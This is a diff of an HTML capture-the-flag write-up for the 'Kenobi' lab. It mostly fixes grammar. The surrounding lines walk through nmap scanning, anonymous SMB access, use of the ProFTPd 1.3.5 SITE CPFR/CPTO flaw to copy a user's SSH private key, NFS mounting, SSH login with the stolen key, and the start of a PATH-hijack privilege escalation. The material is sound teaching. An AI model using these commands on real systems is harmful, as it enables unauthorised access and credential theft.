@@ -6,8 +6,8 @@ Port 80 (HTTP): This suggests the presence of a web server, likely hosting a web
 Port 139/tcp (NetBIOS): This reveals that the machine supports NetBIOS, a networking protocol enabling computers on a local network to share resources like names, printers, and files.<br><br>
 Ports associated with mountd (NFS): These open ports indicate that the system might be configured as an NFS server. NFS (Network File System) allows remote clients to access file systems shared by the server.<br><br>
 
-It's important to note that port 80 don't necessarily guarantee a website's existence. Further investigation might be required to confirm the presence of a web server on port 80.<br><br>
-command parameters:<br>
+It's important to note that port 80 doesn't necessarily guarantee a website's existence. Further investigation might be required to confirm the presence of a web server on port 80.<br><br>
+Command parameters:<br>
 -sCV: This flag tells Nmap to perform a SYN scan and a service version detection.<br>
 -T4: Specifies the timing template used by Nmap during the scan.<br>
 -Pn: Tells Nmap to skip the preliminary ping sweep.<br>
@@ -83,7 +83,7 @@ Host script results:
   </code>
 </pre>
 <br><br>
-I visited the website, but found nothing. I tried Gobuster to see if there was anything useful, but no luck.
+I visited the website, but found nothing. I tried Gobuster to see if there was anything useful, but i had no luck.
 
 <pre><code>
 ~> gobuster dir -u http://10.10.161.115/ -w /SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 | tee kenobi\ gobuster
@@ -151,7 +151,7 @@ Nmap done: 1 IP address (1 host up) scanned in 52.87 seconds
 </code></pre>
 <br><br>
 
-Ee access to the machine through SMBClient with the password “anonymous”, inside we can see that there is a log.txt file.
+We access to the machine through SMBClient with the password “anonymous”, inside we can see that there is a log.txt file.
 <pre><code>
 ~> smbclient //10.10.161.115/anonymous
 Password for [WORKGROUP\Arch]:
@@ -164,13 +164,13 @@ smb: \> ls
 		9204224 blocks of size 1024. 6855428 blocks available
 </code></pre>
 <br><br>
-We download the file to our machine. Inside the .txt file we have too many things, but what is relevant for us is that inside the machine there is a user “kenobi” and he has an id_rsa file, in SSH, an id_rsa file is a private file that stores the private key of a user for SSH authentication, so if we get that file we can access the machine.
+We download the file to our machine. Inside the .txt file you cansee that there are a lot of things, but what is relevant to us is that inside the machine there is a user “kenobi” and he has an id_rsa file, in SSH, an id_rsa file is a private file that stores the private key of a user for SSH authentication, so if we get that file we can access the machine.
 <pre><code>smb: \> get log.txt
 
 getting file \log.txt of size 12237 as log.txt (0,7 KiloBytes/sec) (average 0,7 KiloBytes/sec)</code></pre>
 <br><br>
 
-In our case, port 111 is access to a network file system, Lets use nmap to enumerate this, It suggests that the directory /var/ on the remote machine is potentially shared via NFS. The asterisk (*) means that all subdirectories within /var/ are also exported, let's try to mount the share.
+Since port 111 is open, it suggests NFS might be running on the target machine. We can use nmap to enumerate NFS exports. The output with an asterisk (*) for /var indicates that this directory, along with all its subdirectories, is potentially shared via NFS.
 <pre><code>~> nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.231.175
 Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-08 21:38 -03
 Nmap scan report for 10.10.231.175
@@ -198,7 +198,7 @@ ProFTPd 1.3.5 - File Copy                                         | linux/remote
 Shellcodes: No Results</code></pre>
 <br><br>
 
-Let's conect to the target machine and move the id_rsa file to /tmp/.
+Let's connect to the target machine and move the id_rsa file to /tmp/.
 <pre><code>~> nc 10.10.231.175 21</code></pre>
 <pre><code> </code>~> SITE CPFR /home/kenobi/.ssh/id_rsa
 350 File or directory exists, ready for destination name</pre>
@@ -219,11 +219,11 @@ drwx------  3 root root 4096 sep  4  2019 systemd-private-6f4acd341c0b40569c92ce
 drwx------  3 root root 4096 may  9 02:17 systemd-private-aa4435dcdd804e81af1fe0ab6786e412-systemd-timesyncd.service-Btl8xi/
 drwx------  3 root root 4096 sep  4  2019 systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn/</pre>
 <br><br>
-Now that we have access to the id_rsa file we will copy it to our working directory.
+Now that we have access to the id_rsa file we have to copy it to our working directory.
 <pre><code>cp /mnt/kenobiNSF/tmp/id_rsa /home/Arch/kenobi/</code></pre>
 <br><br>
 
-we have to change the permissions of this file to 600 using chmod, it is necessary for ssh login using the identity file.
+We have to change the permissions of this file to 600 using chmod, it is necesary for a ssh logint to use the identify file.
 <pre><code>~/kenobi> chmod 600 id_rsa</code></pre>
 
 <pre><code>~/kenobi> ssh -i id_rsa kenobi@10.10.180.178</code></pre>
@@ -281,7 +281,7 @@ Content-Type: text/html</code></pre>
 <pre><code>** Enter your choice :2
 4.8.0-58-generic</code></pre>
 <br><br>
-Create a file named ifconfig with the bash path, grant read, write and execute permissions for the ifconfig file, and adds the current directory to the top of the command search list
+Create a file named ifconfig with the bash path, grant read, write and execute permissions for the ifconfig file, and add the current directory to the top of the command search list
 <pre><code>
 kenobi@kenobi:~/share$ echo /bin/bash > ifconfig
 kenobi@kenobi:~/share$ chmod 777 ifconfig
